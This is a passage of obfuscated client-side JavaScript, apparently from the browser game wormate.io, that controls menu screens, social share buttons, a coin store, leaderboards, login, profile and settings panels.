              _0x1ecf05.attr("src", _0x13c1e4.Ij.fl());
              _0x4bb7a2.html(_0x13c1e4.Ij.il());
              _0x529491.width(_0x13c1e4.Ij.kl() * 100 / _0x13c1e4.Ij.ll() + "%");
              _0x46afba.html(_0x13c1e4.Ij.kl() + " / " + _0x13c1e4.Ij.ll());
              _0x5d9607.html(_0x13c1e4.Ij.jl());
              _0x248b55.val(_0x13c1e4.Ij.el());
            } else {
              _0x70bbf4.toggle(_0x13de32.xn && !_0x13c1e4.Tn());
              _0x45f2ed.html(_0x45f2ed.data("guest"));
              _0x1ecf05.attr("src", _0x2c22d1.a.e);
              _0x4bb7a2.html("10");
              _0x529491.width("0");
              _0x46afba.html("");
              _0x5d9607.html(1);
              _0x248b55.val(_0x31b4a1.Vf.fg(_0x31b4a1.Vf.ag));
            }
          });
          _0x13c1e4.On.zj(function () {
            _0x3d26c3.Nn.$l(_0x13c1e4.On.yj());
          });
        };
        _0x33ca8d.prototype.Gk = function () {
          _0x31b4a1.kf.jn.stop();
          _0x31b4a1.kf.jn.fadeOut(50);
          _0x31b4a1.kf.ln.stop();
          _0x31b4a1.kf.ln.fadeOut(50);
          _0x31b4a1.kf.nn.stop();
          _0x31b4a1.kf.nn.fadeIn(500);
          _0x31b4a1.kf.pn.stop();
          _0x31b4a1.kf.pn.fadeOut(50);
          _0x31b4a1.kf.sn.stop();
          _0x31b4a1.kf.sn.fadeOut(50);
          _0x31b4a1.kf.qn.stop();
          _0x31b4a1.kf.qn.fadeOut(50);
          _0x31b4a1.kf.rn.stop();
          _0x31b4a1.kf.rn.fadeOut(50);
          _0x31b4a1.kf.tn.stop();
          _0x31b4a1.kf.tn.fadeOut(50);
          _0x31b4a1.kf.un_error.stop();
          _0x31b4a1.kf.un_error.fadeOut(50);
          _0x31b4a1.kf.mn.stop();
          _0x31b4a1.kf.mn.fadeIn(1);
          _0x31b4a1.kf.bgcanvas.stop();
          _0x31b4a1.kf.bgcanvas.fadeIn(500);
          _0x31b4a1.GameView.Kf(true);
          _0x31b4a1.kf.socialButtons.stop();
          _0x31b4a1.kf.socialButtons.fadeIn(500);
          _0x31b4a1.kf.vn.stop();
          _0x31b4a1.kf.vn.fadeIn(500);
        };
        _0x33ca8d.prototype.Un = function () {
          _0x15d6a0.fadeIn(500);
          _0x410a66.fadeIn(500);
          _0x1cbeab.fadeIn(500);
          _0x512f84.fadeOut(100);
        };
        _0x33ca8d.prototype.Vn = function () {
          _0x15d6a0.fadeOut(100);
          _0x410a66.fadeOut(100);
          _0x1cbeab.fadeOut(100);
          _0x512f84.fadeIn(500);
        };
        _0x33ca8d.prototype.Ln = function (_0x14b70f, _0x2f84de) {
          if (this.Jn !== _0x14b70f) {
            this.Jn = _0x14b70f;
          }
          var _0x33b8ec = _0x2c22d1.P(Math.floor(_0x2f84de * 100), 0, 100);
          if (this.In !== _0x33b8ec) {
            _0x11474f.css({
              width: _0x33b8ec + "%"
            });
            _0x48d6ef.html(_0x33b8ec + " %");
          }
        };
        _0x33ca8d.prototype.Hk = function () {
          _0xe610a0().Ci.Ce();
          this.Nn.Kf(true);
        };
        _0x33ca8d.prototype.Bk = function () {
          this.Nn.Kf(false);
        };
        _0x33ca8d.prototype.Jf = function () {
          this.Nn.Jf();
        };
        _0x33ca8d.prototype.Nf = function (_0x4fb6e2, _0x4ada97) {
          this.Nn.Nf();
        };
        _0x33ca8d.prototype.el = function () {
          return _0x248b55.val();
        };
        _0x33ca8d.prototype.Wn = function () {
          return _0x705b56.val();
        };
        _0x33ca8d.prototype.Qn = function () {};
        _0x33ca8d.prototype.Rn = function () {
          function _0xf5f5e1() {
            _0x184e0b.Xn(true);
            setTimeout(function () {
              _0x70bbf4.hide();
            }, 3000);
          }
          var _0x184e0b = _0xe610a0();
          if (_0x13de32.xn && !_0x184e0b.Tn()) {
            _0x70bbf4.show();
            var _0x4b3567 = _0x2c22d1.H("index.game.main.menu.unlockSkins.share");
            var _0x20ae31 = encodeURIComponent(_0x2c22d1.H("index.game.main.menu.unlockSkins.comeAndPlay") + " https://wormate.io/ #wormate #wormateio");
            var _0x238fd0 = encodeURIComponent(_0x2c22d1.H("index.game.main.menu.unlockSkins.comeAndPlay"));
            _0x4eefa2.append($("<a class=\"mm-skin-over-button\" id=\"mm-skin-over-tw\" target=\"_blank\" href=\"http://twitter.com/intent/tweet?status=" + _0x20ae31 + "\"><img src=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZlcnNpb249IjEuMSIgd2lkdGg9IjQ1NiIgaGVpZ2h0PSI0NTYiIHhtbDpzcGFjZT0icHJlc2VydmUiPjxwYXRoIGQ9Ik02MCAzMzhjMzAgMTkgNjYgMzAgMTA1IDMwIDEwOCAwIDE5Ni04OCAxOTYtMTk2IDAtMyAwLTUgMC04IDQtMyAyOC0yMyAzNC0zNSAwIDAtMjAgOC0zOSAxMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAyLTEgMjctMTggMzAtMzggMCAwLTE0IDctMzMgMTQgLTMgMS03IDItMTAgMyAtMTMtMTMtMzAtMjItNTAtMjIgLTM4IDAtNjkgMzEtNjkgNjkgMCA1IDEgMTEgMiAxNiAtNSAwLTg2LTUtMTQxLTcxIDAgMC0zMyA0NSAyMCA5MSAwIDAtMTYtMS0zMC05IDAgMC01IDU0IDU0IDY4IDAgMC0xMiA0LTMwIDEgMCAwIDEwIDQ0IDYzIDQ4IDAgMC00MiAzOC0xMDEgMjlMNjAgMzM4eiIgZmlsbD0iI0ZGRiIvPjwvc3ZnPg==\"><span>" + _0x4b3567 + "</span></a>").click(_0xf5f5e1));
            _0x4eefa2.append($("<a class=\"mm-skin-over-button\" id=\"mm-skin-over-fb\" target=\"_blank\" href=\"https://www.facebook.com/dialog/share?app_id=861926850619051&display=popup&href=https%3A%2F%2Fwormate.io&redirect_uri=https%3A%2F%2Fwormate.io&hashtag=%23wormateio&quote=" + _0x238fd0 + "\"><img src=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZlcnNpb249IjEuMSIgeD0iMCIgeT0iMCIgdmlld0JveD0iMCAwIDQ1NiA0NTYiIHhtbDpzcGFjZT0icHJlc2VydmUiPjxwYXRoIGQ9Ik0yNDQuMyA0NTZWMjc5LjdoLTU5LjN2LTcxLjloNTkuM3YtNjAuNGMwLTQzLjkgMzUuNi03OS41IDc5LjUtNzkuNWg2MnY2NC42aC00NC40Yy0xMy45IDAtMjUuMyAxMS4zLTI1LjMgMjUuM3Y1MGg2OC41bC05LjUgNzEuOWgtNTkuMVY0NTZ6IiBmaWxsPSIjZmZmIi8+PC9zdmc+\"><span>" + _0x4b3567 + "</span></a>").click(_0xf5f5e1));
          }
        };
        return _0x33ca8d;
      }();
      _0x31b4a1.yk = function () {
        var _0xcb43f1 = _0x2c22d1.M(_0x31b4a1.kf, function () {
          _0x31b4a1.kf.call(this, _0x31b4a1.Fk.wn);
        });
        _0xcb43f1.prototype.ha = function () {};
        _0xcb43f1.prototype.Gk = function () {
          _0x31b4a1.kf.jn.stop();
          _0x31b4a1.kf.jn.fadeOut(50);
          _0x31b4a1.kf.ln.stop();
          _0x31b4a1.kf.ln.fadeOut(50);
          _0x31b4a1.kf.nn.stop();
          _0x31b4a1.kf.nn.fadeOut(50);
          _0x31b4a1.kf.pn.stop();
          _0x31b4a1.kf.pn.fadeOut(50);
          _0x31b4a1.kf.sn.stop();
          _0x31b4a1.kf.sn.fadeOut(50);
          _0x31b4a1.kf.qn.stop();
          _0x31b4a1.kf.qn.fadeOut(50);
          _0x31b4a1.kf.rn.stop();
          _0x31b4a1.kf.rn.fadeOut(50);
          _0x31b4a1.kf.tn.stop();
          _0x31b4a1.kf.tn.fadeOut(50);
          _0x31b4a1.kf.un_error.stop();
          _0x31b4a1.kf.un_error.fadeOut(50);
          _0x31b4a1.kf.mn.stop();
          _0x31b4a1.kf.mn.fadeOut(1);
          _0x31b4a1.kf.bgcanvas.stop();
          _0x31b4a1.kf.bgcanvas.fadeOut(50);
          _0x31b4a1.GameView.Kf(false);
          _0x31b4a1.kf.socialButtons.stop();
          _0x31b4a1.kf.socialButtons.fadeOut(50);
          _0x31b4a1.kf.vn.stop();
          _0x31b4a1.kf.vn.fadeOut(50);
        };
        return _0xcb43f1;
      }();
      _0x31b4a1.pk = function () {
        var _0x47fd1a = _0x2c22d1.M(_0x31b4a1.kf, function () {
          _0x31b4a1.kf.call(this, _0x31b4a1.Fk.wn);
        });
        _0x47fd1a.prototype.ha = function () {};
        _0x47fd1a.prototype.Gk = function () {
          _0x31b4a1.kf.jn.stop();
          _0x31b4a1.kf.jn.fadeOut(50);
          _0x31b4a1.kf.ln.stop();
          _0x31b4a1.kf.ln.fadeOut(50);
          _0x31b4a1.kf.nn.stop();
          _0x31b4a1.kf.nn.fadeOut(50);
          _0x31b4a1.kf.pn.stop();
          _0x31b4a1.kf.pn.fadeOut(50);
          _0x31b4a1.kf.sn.stop();
          _0x31b4a1.kf.sn.fadeOut(50);
          _0x31b4a1.kf.qn.stop();
          _0x31b4a1.kf.qn.fadeOut(50);
          _0x31b4a1.kf.rn.stop();
          _0x31b4a1.kf.rn.fadeIn(500);
          _0x31b4a1.kf.tn.stop();
          _0x31b4a1.kf.tn.fadeOut(50);
          _0x31b4a1.kf.un_error.stop();
          _0x31b4a1.kf.un_error.fadeOut(50);
          _0x31b4a1.kf.mn.stop();
          _0x31b4a1.kf.mn.fadeIn(1);
          _0x31b4a1.kf.bgcanvas.stop();
          _0x31b4a1.kf.bgcanvas.fadeIn(500);
          _0x31b4a1.GameView.Kf(true);
          _0x31b4a1.kf.socialButtons.stop();
          _0x31b4a1.kf.socialButtons.fadeOut(50);
          _0x31b4a1.kf.vn.stop();
          _0x31b4a1.kf.vn.fadeOut(50);
        };
        _0x47fd1a.prototype.Hk = function () {};
        return _0x47fd1a;
      }();
      _0x31b4a1.rk = function () {
        var _0x463d8a = $("#toaster-stack");
        var _0xbfab19 = _0x2c22d1.M(_0x31b4a1.kf, function () {
          _0x31b4a1.kf.call(this, _0x31b4a1.Fk.wn);
          this.Yn = [];
          this.Zn = null;
        });
        _0xbfab19.prototype.ha = function () {};
        _0xbfab19.prototype.Gk = function () {
          _0x31b4a1.kf.jn.stop();
          _0x31b4a1.kf.jn.fadeOut(50);
          _0x31b4a1.kf.ln.stop();
          _0x31b4a1.kf.ln.fadeOut(50);
          _0x31b4a1.kf.nn.stop();
          _0x31b4a1.kf.nn.fadeOut(50);
          _0x31b4a1.kf.pn.stop();
          _0x31b4a1.kf.pn.fadeOut(50);
          _0x31b4a1.kf.sn.stop();
          _0x31b4a1.kf.sn.fadeIn(500);
          _0x31b4a1.kf.qn.stop();
          _0x31b4a1.kf.qn.fadeOut(50);
          _0x31b4a1.kf.rn.stop();
          _0x31b4a1.kf.rn.fadeOut(50);
          _0x31b4a1.kf.tn.stop();
          _0x31b4a1.kf.tn.fadeOut(50);
          _0x31b4a1.kf.un_error.stop();
          _0x31b4a1.kf.un_error.fadeOut(50);
          _0x31b4a1.kf.mn.stop();
          _0x31b4a1.kf.mn.fadeIn(1);
          _0x31b4a1.kf.bgcanvas.stop();
          _0x31b4a1.kf.bgcanvas.fadeIn(500);
          _0x31b4a1.GameView.Kf(true);
          _0x31b4a1.kf.socialButtons.stop();
          _0x31b4a1.kf.socialButtons.fadeOut(50);
          _0x31b4a1.kf.vn.stop();
          _0x31b4a1.kf.vn.fadeIn(500);
        };
        _0xbfab19.prototype.Hk = function () {
          this.$n();
        };
        _0xbfab19.prototype.Kk = function () {
          return this.Zn != null || this.Yn.length > 0;
        };
        _0xbfab19.prototype._n = function (_0x517dee) {
          this.Yn.unshift(_0x517dee);
          setTimeout(function () {
            _0xe610a0().og.Ik();
          }, 0);
        };
        _0xbfab19.prototype.El = function (_0x4e3968) {
          this.Yn.push(_0x4e3968);
          setTimeout(function () {
            _0xe610a0().og.Ik();
          }, 0);
        };
        _0xbfab19.prototype.$n = function () {
          var _0x5beecb = this;
          if (this.Zn == null) {
            if (this.Yn.length == 0) {
              _0xe610a0().og.Dk();
              return;
            }
            var _0x4fcabd = this.Yn.shift();
            this.Zn = _0x4fcabd;
            var _0x128172 = _0x4fcabd.tf();
            _0x128172.hide();
            _0x128172.fadeIn(300);
            _0x463d8a.append(_0x128172);
            _0x4fcabd.ao = function () {
              _0x128172.fadeOut(300);
              setTimeout(function () {
                _0x128172.remove();
              }, 300);
              if (_0x5beecb.Zn == _0x4fcabd) {
                _0x5beecb.Zn = null;
              }
              _0x5beecb.$n();
            };
            _0x4fcabd.Hk();
          }
        };
        return _0xbfab19;
      }();
      _0x31b4a1.Fk = {
        wn: 0,
        Ek: 1
      };
      _0x31b4a1.bo = function () {
        var _0x5c4167 = $("#popup-menu-label");
        var _0x38095e = $("#popup-menu-coins-box");
        var _0x132149 = $("#popup-menu-coins-val");
        $("#popup-menu-back").click(function () {
          var _0x1ad4a6 = _0xe610a0();
          _0x1ad4a6.Ci.Be();
          _0x1ad4a6.og.Dk();
        });
        _0x38095e.click(function () {
          var _0x34002d = _0xe610a0();
          if (_0x34002d.Ij.Hj()) {
            _0x34002d.Ci.Be();
            _0x34002d.og.Ak(_0x34002d.og._j);
          }
        });
        var _0x214650 = _0x2c22d1.M(_0x31b4a1.kf, function (_0x37c3c6, _0x555f80) {
          _0x31b4a1.kf.call(this, _0x31b4a1.Fk.Ek);
          this.ma = _0x37c3c6;
          this.co = _0x555f80;
          this.do = [];
        });
        _0x214650.prototype.ha = function () {
          _0x214650.parent.prototype.ha.call(this);
          if (!_0x214650.eo) {
            _0x214650.eo = true;
            var _0x3d90cd = _0xe610a0();
            _0x3d90cd.Ij.zl(function () {
              if (_0x3d90cd.Ij.Hj()) {
                _0x132149.html(_0x3d90cd.Ij.il());
              } else {
                _0x132149.html("0");
              }
            });
          }
          _0x31b4a1.bo.fo.stop();
          _0x31b4a1.bo.fo.fadeOut(100);
        };
        _0x214650.go = $("#coins-view");
        _0x214650.ho = $("#leaders-view");
        _0x214650.io = $("#profile-view");
        _0x214650.jo = $("#settings-view");
        _0x214650.ko = $("#login-view");
        _0x214650.lo = $("#skins-view");
        _0x214650.mo = $("#store-view");
        _0x214650.no = $("#wear-view");
        _0x214650.oo = $("#withdraw-consent-view");
        _0x214650.po = $("#delete-account-view");
        _0x214650.fo = $("#please-wait-view");
        _0x214650.prototype.Gk = function () {
          _0x31b4a1.kf.jn.stop();
          _0x31b4a1.kf.jn.fadeOut(200);
          _0x31b4a1.kf.ln.stop();
          _0x31b4a1.kf.ln.fadeOut(200);
          _0x31b4a1.kf.nn.stop();
          _0x31b4a1.kf.nn.fadeOut(200);
          _0x31b4a1.kf.pn.stop();
          _0x31b4a1.kf.pn.fadeIn(200);
          _0x31b4a1.kf.sn.stop();
          _0x31b4a1.kf.sn.fadeOut(200);
          _0x31b4a1.kf.qn.stop();
          _0x31b4a1.kf.qn.fadeOut(200);
          _0x31b4a1.kf.rn.stop();
          _0x31b4a1.kf.rn.fadeOut(200);
          _0x31b4a1.kf.tn.stop();
          _0x31b4a1.kf.tn.fadeOut(200);
          _0x31b4a1.kf.un_error.stop();
          _0x31b4a1.kf.un_error.fadeOut(200);
          _0x31b4a1.kf.mn.stop();
          _0x31b4a1.kf.mn.fadeIn(1);
          _0x31b4a1.kf.bgcanvas.stop();
          _0x31b4a1.kf.bgcanvas.fadeIn(500);
          _0x31b4a1.GameView.Kf(true);
          _0x31b4a1.kf.socialButtons.stop();
          _0x31b4a1.kf.socialButtons.fadeIn(200);
          _0x31b4a1.kf.vn.stop();
          _0x31b4a1.kf.vn.fadeIn(200);
          _0x5c4167.html(this.ma);
          _0x38095e.toggle(this.co);
          this.qo();
        };
        _0x214650.prototype.qo = function () {};
        _0x214650.prototype.ro = function (_0x54f491) {
          var _0x5dc598 = this;
          var _0x1e5fa3 = _0x2c22d1.V(0, 2147483647) & 2147483647;
          this.do.push(_0x1e5fa3);
          _0x31b4a1.bo.fo.stop();
          _0x31b4a1.bo.fo.fadeIn(100);
          setTimeout(function () {
            _0x5dc598.so(_0x1e5fa3);
          }, _0x54f491);
          return new _0x1f9d68(this, _0x1e5fa3);
        };
        _0x214650.prototype.so = function (_0x150857) {
          var _0x2dd0b6 = this.do.indexOf(_0x150857);
          if (!(_0x2dd0b6 < 0)) {
            this.do.splice(_0x2dd0b6, 1);
            if (this.do.length === 0) {
              _0x31b4a1.bo.fo.stop();
              _0x31b4a1.bo.fo.fadeOut(100);
            }
          }
        };
        return _0x214650;
      }();
      var _0x1f9d68 = function () {
        function _0x2d72fc(_0xa2dd5b, _0xb48609) {
          this.to = _0xa2dd5b;
          this.uo = _0xb48609;
        }
        _0x2d72fc.prototype.vo = function () {
          this.to.so(this.uo);
        };
        return _0x2d72fc;
      }();
      _0x31b4a1.ak = function () {
        var _0xd2c6a = $("#store-buy-coins_125000");
        var _0x540533 = $("#store-buy-coins_50000");
        var _0x22171a = $("#store-buy-coins_16000");
        var _0x20ee5c = $("#store-buy-coins_7000");
        var _0x3b1968 = $("#store-buy-coins_3250");
        var _0x2438ff = $("#store-buy-coins_1250");
        var _0x353078 = _0x2c22d1.M(_0x31b4a1.bo, function () {
          _0x31b4a1.bo.call(this, _0x2c22d1.H("index.game.popup.menu.coins.tab"), false);
          var _0x318c00 = _0xe610a0();
          var _0x421856 = this;
          _0xd2c6a.click(function () {
            _0x318c00.Ci.Be();
            _0x421856.wo("coins_125000");
          });
          _0x540533.click(function () {
            _0x318c00.Ci.Be();
            _0x421856.wo("coins_50000");
          });
          _0x22171a.click(function () {
            _0x318c00.Ci.Be();
            _0x421856.wo("coins_16000");
          });
          _0x20ee5c.click(function () {
            _0x318c00.Ci.Be();
            _0x421856.wo("coins_7000");
          });
          _0x3b1968.click(function () {
            _0x318c00.Ci.Be();
            _0x421856.wo("coins_3250");
          });
          _0x2438ff.click(function () {
            _0x318c00.Ci.Be();
            _0x421856.wo("coins_1250");
          });
        });
        _0x353078.prototype.ha = function () {
          _0x353078.parent.prototype.ha.call(this);
        };
        _0x353078.prototype.qo = function () {
          _0x31b4a1.bo.go.stop();
          _0x31b4a1.bo.go.fadeIn(200);
          _0x31b4a1.bo.ho.stop();
          _0x31b4a1.bo.ho.fadeOut(50);
          _0x31b4a1.bo.io.stop();
          _0x31b4a1.bo.io.fadeOut(50);
          _0x31b4a1.bo.ko.stop();
          _0x31b4a1.bo.ko.fadeOut(50);
          _0x31b4a1.bo.jo.stop();
          _0x31b4a1.bo.jo.fadeOut(50);
          _0x31b4a1.bo.lo.stop();
          _0x31b4a1.bo.lo.fadeOut(50);
          _0x31b4a1.bo.mo.stop();
          _0x31b4a1.bo.mo.fadeOut(50);
          _0x31b4a1.bo.no.stop();
          _0x31b4a1.bo.no.fadeOut(50);
          _0x31b4a1.bo.oo.stop();
          _0x31b4a1.bo.oo.fadeOut(50);
          _0x31b4a1.bo.po.stop();
          _0x31b4a1.bo.po.fadeOut(50);
        };
        _0x353078.prototype.Hk = function () {
          _0xe610a0().Ci.Ce();
        };
        _0x353078.prototype.wo = function (_0x1b031b) {};
        return _0x353078;
      }();
      _0x31b4a1.ck = function () {
        var _0x4f0804 = $("#highscore-table");
        var _0x613cde = $("#leaders-button-level");
        var _0x1e660d = $("#leaders-button-highscore");
        var _0xb3591c = $("#leaders-button-kills");
        var _0x53c463 = _0x2c22d1.M(_0x31b4a1.bo, function () {
          _0x31b4a1.bo.call(this, _0x2c22d1.H("index.game.popup.menu.leaders.tab"), true);
          var _0x3f5fd7 = _0xe610a0();
          var _0x531d7e = this;
          this.xo = {};
          this.yo = {
            zo: {
              Ao: _0x613cde,
              Bo: "byLevel"
            },
            Co: {
              Ao: _0x1e660d,
              Bo: "byHighScore"
            },
            Do: {
              Ao: _0xb3591c,
              Bo: "byKillsAndHeadShots"
            }
          };
          _0x613cde.click(function () {
            _0x3f5fd7.Ci.Be();
            _0x531d7e.Eo(_0x531d7e.yo.zo);
          });
          _0x1e660d.click(function () {
            _0x3f5fd7.Ci.Be();
            _0x531d7e.Eo(_0x531d7e.yo.Co);
          });
          _0xb3591c.click(function () {
            _0x3f5fd7.Ci.Be();
            _0x531d7e.Eo(_0x531d7e.yo.Do);
          });
        });
        _0x53c463.prototype.ha = function () {
          _0x53c463.parent.prototype.ha.call(this);
        };
        _0x53c463.prototype.qo = function () {
          _0x31b4a1.bo.go.stop();
          _0x31b4a1.bo.go.fadeOut(50);
          _0x31b4a1.bo.ho.stop();
          _0x31b4a1.bo.ho.fadeIn(200);
          _0x31b4a1.bo.io.stop();
          _0x31b4a1.bo.io.fadeOut(50);
          _0x31b4a1.bo.ko.stop();
          _0x31b4a1.bo.ko.fadeOut(50);
          _0x31b4a1.bo.jo.stop();
          _0x31b4a1.bo.jo.fadeOut(50);
          _0x31b4a1.bo.lo.stop();
          _0x31b4a1.bo.lo.fadeOut(50);
          _0x31b4a1.bo.mo.stop();
          _0x31b4a1.bo.mo.fadeOut(50);
          _0x31b4a1.bo.no.stop();
          _0x31b4a1.bo.no.fadeOut(50);
          _0x31b4a1.bo.oo.stop();
          _0x31b4a1.bo.oo.fadeOut(50);
          _0x31b4a1.bo.po.stop();
          _0x31b4a1.bo.po.fadeOut(50);
        };
        _0x53c463.prototype.Hk = function () {
          var _0x51a226 = this;
          _0xe610a0().Ci.Ce();
          var _0x2d3992 = this.ro(5000);
          var _0x2ab413 = _0x2c22d1.a.b + "/pub/leaders";
          _0x2c22d1.Z(_0x2ab413, function () {
            _0x51a226.xo = {
              byLevel: [],
              byHighScore: [],
              byKillsAndHeadShots: []
            };
            _0x51a226.Eo(_0x51a226.Fo ?? _0x51a226.yo.zo);
            _0x2d3992.vo();
          }, function (_0x52c9ad) {
            _0x51a226.xo = _0x52c9ad;
            _0x51a226.Eo(_0x51a226.Fo ?? _0x51a226.yo.zo);
            _0x2d3992.vo();
          });
        };
        _0x53c463.prototype.Eo = function (_0x1b6738) {
          this.Fo = _0x1b6738;
          for (var _0x2db2ce in this.yo) {
            if (this.yo.hasOwnProperty(_0x2db2ce)) {
              var _0xe27cc = this.yo[_0x2db2ce];
              _0xe27cc.Ao.removeClass("pressed");
            }
          }
          this.Fo.Ao.addClass("pressed");
          for (var _0x3595f3 = this.xo[this.Fo.Bo], _0x35dab0 = "", _0x48fc11 = 0; _0x48fc11 < _0x3595f3.length; _0x48fc11++) {
            var _0x2dc95a = _0x3595f3[_0x48fc11];
            _0x35dab0 += "<div class=\"table-row\"><span>" + (_0x48fc11 + 1) + "</span><span><img src=\"" + _0x2dc95a.avatarUrl + "\"/></span><span>" + _0x2dc95a.username + "</span><span>" + _0x2dc95a.level + "</span><span>" + _0x2dc95a.highScore + "</span><span>" + _0x2dc95a.headShots + " / " + _0x2dc95a.kills + "</span></div>";
          }
          _0x4f0804.empty();
          _0x4f0804.append(_0x35dab0);
        };
        return _0x53c463;
      }();
      _0x31b4a1.gk = function () {
        var _0xec447a = $("#popup-login-gg");
        var _0x5a106d = $("#popup-login-fb");
        var _0x19239e = _0x2c22d1.M(_0x31b4a1.bo, function () {
          var _0x334787 = this;
          _0x31b4a1.bo.call(this, _0x2c22d1.H("index.game.popup.menu.login.tab"), false);
          var _0x594412 = _0xe610a0();
          _0xec447a.click(function () {
            _0x594412.Ci.Be();
            var _0x34334f = _0x334787.ro(10000);
            setTimeout(function () {
              _0x594412.Ij.Ml(function () {
                if (_0x594412.Ij.Hj()) {
                  _0x594412.Ci.Fe();
                }
                _0x34334f.vo();
              });
            }, 500);
          });
          _0x5a106d.click(function () {
            _0x594412.Ci.Be();
            var _0x2238b8 = _0x334787.ro(10000);
            setTimeout(function () {
              _0x594412.Ij.Jl(function () {
                if (_0x594412.Ij.Hj()) {
                  _0x594412.Ci.Fe();
                }
                _0x2238b8.vo();
              });
            }, 500);
          });
        });
        _0x19239e.prototype.ha = function () {
          _0x19239e.parent.prototype.ha.call(this);
        };
        _0x19239e.prototype.qo = function () {
          _0x31b4a1.bo.go.stop();
          _0x31b4a1.bo.go.fadeOut(50);
          _0x31b4a1.bo.ho.stop();
          _0x31b4a1.bo.ho.fadeOut(50);
          _0x31b4a1.bo.io.stop();
          _0x31b4a1.bo.io.fadeOut(50);
          _0x31b4a1.bo.ko.stop();
          _0x31b4a1.bo.ko.fadeIn(200);
          _0x31b4a1.bo.jo.stop();
          _0x31b4a1.bo.jo.fadeOut(50);
          _0x31b4a1.bo.lo.stop();
          _0x31b4a1.bo.lo.fadeOut(50);
          _0x31b4a1.bo.mo.stop();
          _0x31b4a1.bo.mo.fadeOut(50);
          _0x31b4a1.bo.no.stop();
          _0x31b4a1.bo.no.fadeOut(50);
          _0x31b4a1.bo.oo.stop();
          _0x31b4a1.bo.oo.fadeOut(50);
          _0x31b4a1.bo.po.stop();
          _0x31b4a1.bo.po.fadeOut(50);
        };
        _0x19239e.prototype.Hk = function () {
          _0xe610a0().Ci.Ce();
        };
        return _0x19239e;
      }();
      _0x31b4a1.ek = function () {
        var _0x1bbee6 = $("#profile-avatar");
        var _0x45f4fc = $("#profile-username");
        var _0x8d8a4c = $("#profile-experience-bar");
        var _0x4a58b5 = $("#profile-experience-val");
        var _0x55d4e3 = $("#profile-level");
        var _0xa0056d = $("#profile-stat-highScore");
        var _0x1e7b26 = $("#profile-stat-bestSurvivalTime");
        var _0x3234f5 = $("#profile-stat-kills");
        var _0x5df7e8 = $("#profile-stat-headshots");
        var _0x489a9a = $("#profile-stat-gamesPlayed");
        var _0x10fd12 = $("#profile-stat-totalTimeSpent");
        var _0x42b445 = $("#profile-stat-registrationDate");
        var _0x35e094 = _0x2c22d1.M(_0x31b4a1.bo, function () {
          _0x31b4a1.bo.call(this, _0x2c22d1.H("index.game.popup.menu.profile.tab"), true);
        });
        _0x35e094.prototype.ha = function () {
          _0x35e094.parent.prototype.ha.call(this);
        };
        _0x35e094.prototype.qo = function () {
          _0x31b4a1.bo.go.stop();
          _0x31b4a1.bo.go.fadeOut(50);
          _0x31b4a1.bo.ho.stop();
          _0x31b4a1.bo.ho.fadeOut(50);
          _0x31b4a1.bo.io.stop();
          _0x31b4a1.bo.io.fadeIn(200);
          _0x31b4a1.bo.ko.stop();
          _0x31b4a1.bo.ko.fadeOut(50);
          _0x31b4a1.bo.jo.stop();
          _0x31b4a1.bo.jo.fadeOut(50);
          _0x31b4a1.bo.lo.stop();
          _0x31b4a1.bo.lo.fadeOut(50);
          _0x31b4a1.bo.mo.stop();
          _0x31b4a1.bo.mo.fadeOut(50);
          _0x31b4a1.bo.no.stop();
          _0x31b4a1.bo.no.fadeOut(50);
          _0x31b4a1.bo.oo.stop();
          _0x31b4a1.bo.oo.fadeOut(50);
          _0x31b4a1.bo.po.stop();
          _0x31b4a1.bo.po.fadeOut(50);
        };
        _0x35e094.prototype.Hk = function () {
          var _0x57ab47 = _0xe610a0();
          _0x57ab47.Ci.Ce();
          var _0x57a037 = _0x57ab47.Ij.xl();
          var _0x57eec0 = moment([_0x57a037.year, _0x57a037.month - 1, _0x57a037.day]).format("LL");
          _0x45f4fc.html(_0x57ab47.Ij.dl());
          _0x1bbee6.attr("src", _0x57ab47.Ij.fl());
          _0x8d8a4c.width(_0x57ab47.Ij.kl() * 100 / _0x57ab47.Ij.ll() + "%");
          _0x4a58b5.html(_0x57ab47.Ij.kl() + " / " + _0x57ab47.Ij.ll());
          _0x55d4e3.html(_0x57ab47.Ij.jl());
          _0xa0056d.html(_0x57ab47.Ij.rl());
          _0x1e7b26.html(_0x2c22d1.J(_0x57ab47.Ij.sl()));
          _0x3234f5.html(_0x57ab47.Ij.tl());
          _0x5df7e8.html(_0x57ab47.Ij.ul());
          _0x489a9a.html(_0x57ab47.Ij.vl());
          _0x10fd12.html(_0x2c22d1.J(_0x57ab47.Ij.wl()));
          _0x42b445.html(_0x57eec0);
        };
        return _0x35e094;
      }();
      _0x31b4a1.hk = function () {
        var _0x2a4512 = $("#settings-music-enabled-switch");
        var _0xd79590 = $("#settings-sfx-enabled-switch");
        var _0x5b2782 = $("#settings-show-names-switch");
        var _0x160733 = $("#popup-logout");
        var _0x5e7259 = $("#popup-logout-container");
        var _0x16fd6f = $("#popup-delete-account");
        var _0x1db833 = $("#popup-delete-account-container");
        var _0x42bdbf = $("#popup-withdraw-consent");
        var _0x4d3e3d = _0x2c22d1.M(_0x31b4a1.bo, function () {
          _0x31b4a1.bo.call(this, _0x2c22d1.H("index.game.popup.menu.settings.tab"), false);
          var _0x38ae43 = this;
          var _0x1ec8b6 = _0xe610a0();
          _0x2a4512.click(function () {
            var _0x41ac43 = !!_0x2a4512.prop("checked");
            _0x31b4a1.Vf.eg(_0x31b4a1.Vf.Yf, _0x41ac43, 30);
            _0x1ec8b6.Ci.re(_0x41ac43);
            _0x1ec8b6.Ci.Be();
          });
          _0xd79590.click(function () {
            var _0x312614 = !!_0xd79590.prop("checked");
            _0x31b4a1.Vf.eg(_0x31b4a1.Vf.Zf, _0x312614, 30);
            _0x1ec8b6.Ci.oe(_0x312614);
            _0x1ec8b6.Ci.Be();
          });
          _0x5b2782.click(function () {
            _0x1ec8b6.Ci.Be();
          });
          _0x160733.click(function () {
            _0x1ec8b6.Ci.Be();
            _0x38ae43.ro(500);
            _0x1ec8b6.Ij.Kl();
          });
          _0x16fd6f.click(function () {
            if (_0x1ec8b6.Ij.Hj()) {
              _0x1ec8b6.Ci.Be();
              _0x1ec8b6.og.Ak(_0x1ec8b6.og.Zj);
            } else {
              _0x1ec8b6.Ci.Ge();
            }
          });
          _0x42bdbf.click(function () {
            if (_0x1ec8b6.Go()) {
              _0x1ec8b6.Ci.Be();
